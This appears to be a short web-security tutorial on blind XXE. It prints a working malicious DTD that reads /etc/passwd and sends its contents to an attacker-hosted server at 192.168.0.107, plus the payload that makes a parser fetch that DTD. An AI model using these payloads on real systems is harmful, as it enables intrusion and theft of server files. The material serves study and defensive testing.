# Exploiting blind XXE to exfiltrate data out-of-band

Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

An example of a malicious **DTD** to exfiltrate the contents of the `/etc/passwd` file is as follows:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.0.107/?x=%file;'>">
%eval;
%exfiltrate;
```
So, this is maliciuous .dtd file for blind XXE vulnerability. Attacker can simply start http python web server and send this malicious payload:
```bash
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://192.168.0.107/malicious.dtd"> %xxe;]>
```
This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed.
